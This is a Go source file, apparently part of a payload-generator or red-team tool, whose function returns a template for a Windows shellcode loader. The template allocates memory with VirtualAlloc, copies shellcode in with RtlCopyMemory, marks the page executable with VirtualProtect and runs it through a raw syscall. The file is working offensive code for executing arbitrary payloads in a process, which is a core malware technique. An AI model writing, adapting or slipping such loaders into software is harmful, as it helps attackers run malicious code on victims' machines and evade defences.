package loaders

import (
	"fmt"
)

func GetSyscallTemplate(targetProcess string) string {
	_ = targetProcess // unused in this technique

	println("\n\n[!] PLEASE NOTE: shellcode will not be injected into new process with this method")

	return fmt.Sprintf(`
package main

import (
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
)

func ExecuteOrderSixtySix(shellcode []byte) {

	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	ntdll := syscall.MustLoadDLL("ntdll.dll")

	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	VirtualProtect := kernel32.MustFindProc("VirtualProtect")
	RtlCopyMemory := ntdll.MustFindProc("RtlCopyMemory")

	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	oldProtect := PAGE_READWRITE
	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	_, _, _ = syscall.Syscall(addr, 0, 0, 0, 0)
}
    `)
}
